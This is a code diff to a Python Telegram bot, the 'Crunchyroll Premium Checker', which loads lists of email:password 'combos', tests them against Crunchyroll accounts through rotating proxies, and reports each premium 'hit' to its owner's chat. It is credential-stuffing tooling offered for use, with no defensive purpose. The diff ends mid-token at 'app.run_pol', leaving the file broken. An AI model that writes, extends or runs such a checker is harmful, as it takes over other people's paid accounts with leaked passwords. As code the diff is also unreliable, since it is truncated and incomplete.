@@ -21,7 +21,43 @@ OWNER_ID = int(os.getenv("OWNER_ID", 0))
 class CrunchyrollChecker:
     def __init__(self, proxies=None):
         self.proxies = proxies or []
-        self.countries = { ... }   # ← Your full countries dict is already here (same as original)
+        self.countries = {
+            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
+            "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
+            "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
+            "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
+            "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
+            "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
+            "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
+            "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
+            "CU": "Cuba 🇨🇺", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
+            "DK": "Denmark 🇩🇰", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨",
+            "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "EE": "Estonia 🇪🇪",
+            "ET": "Ethiopia 🇪🇹", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
+            "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GR": "Greece 🇬🇷",
+            "GT": "Guatemala 🇬🇹", "HT": "Haiti 🇭🇹", "HN": "Honduras 🇭🇳",
+            "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
+            "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷",
+            "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IL": "Israel 🇮🇱",
+            "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵",
+            "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
+            "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻",
+            "LB": "Lebanon 🇱🇧", "LY": "Libya 🇱🇾", "LT": "Lithuania 🇱🇹",
+            "LU": "Luxembourg 🇱🇺", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
+            "MA": "Morocco 🇲🇦", "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿",
+            "NG": "Nigeria 🇳🇬", "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲",
+            "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦", "PE": "Peru 🇵🇪",
+            "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
+            "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
+            "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
+            "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
+            "ZA": "South Africa 🇿🇦", "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰",
+            "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼",
+            "TH": "Thailand 🇹🇭", "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦",
+            "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧",
+            "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "VE": "Venezuela 🇻🇪",
+            "VN": "Vietnam 🇻🇳"
+        }
 
     def _get_random_proxy(self):
         if not self.proxies:
@@ -30,7 +66,6 @@ class CrunchyrollChecker:
         return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
     def check(self, email, password):
-        # === YOUR ORIGINAL CHECK LOGIC (unchanged) ===
         device_id = str(uuid.uuid4())
         session = requests.Session()
         
@@ -175,14 +210,9 @@ CHECKED BY: @Sudhakaran12
     return capture
 
 
-# ===================== BOT =====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🚀 <b>Crunchyroll Premium Checker</b>\n\n"
-        "Bot made by @Sudhakaran12\n\n"
-        "Use /check to load combos\n"
-        "Use /proxies to load proxies\n"
-        "Then /startcheck",
+        "🚀 <b>Crunchyroll Premium Checker</b>\n\nBot made by @Sudhakaran12",
         parse_mode=ParseMode.HTML
     )
 
@@ -191,7 +221,7 @@ async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ Unauthorized!")
         return
-    await update.message.reply_text("📤 Send combo file or paste combos directly")
+    await update.message.reply_text("📤 Send combo file or paste combos")
     context.user_data['waiting'] = 'combo'
 
 
@@ -246,7 +276,7 @@ async def startcheck_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No combos! Use /check first.")
         return
 
-    await update.message.reply_text(f"🚀 Starting...\nCombos: {len(combos)}\nProxies: {len(active_proxies) or 'None'}")
+    await update.message.reply_text(f"🚀 Starting check...\nCombos: {len(combos)}\nProxies: {len(active_proxies) or 'None'}")
 
     threading.Thread(target=run_checker, args=(combos, update.effective_chat.id, context.application.bot), daemon=True).start()
 
@@ -274,11 +304,13 @@ def run_checker(combos, chat_id, bot):
                 if result['status'] == 'PREMIUM':
                     stats['premium'] += 1
                     capture = save_hit(result)
-                    asyncio.run(bot.send_message(chat_id=chat_id, text=f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode=ParseMode.HTML))
+                    asyncio.run(bot.send_message(
+                        chat_id=chat_id,
+                        text=f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>",
+                        parse_mode=ParseMode.HTML
+                    ))
                 elif result['status'] == 'FREE':
                     stats['free'] += 1
-                else:
-                    stats['invalid'] += 1
             except:
                 stats['invalid'] += 1
             finally:
@@ -312,11 +344,7 @@ def main():
     app.add_handler(CommandHandler("proxies", proxies_cmd))
     app.add_handler(CommandHandler("startcheck", startcheck_cmd))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))   # ← THIS LINE IS NOW CLEAN
+    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
 
     print("🤖 Bot Started | Made by @Sudhakaran12")
-    app.run_polling()
-
-
-if __name__ == "__main__":
-    main()
+    app.run_pol
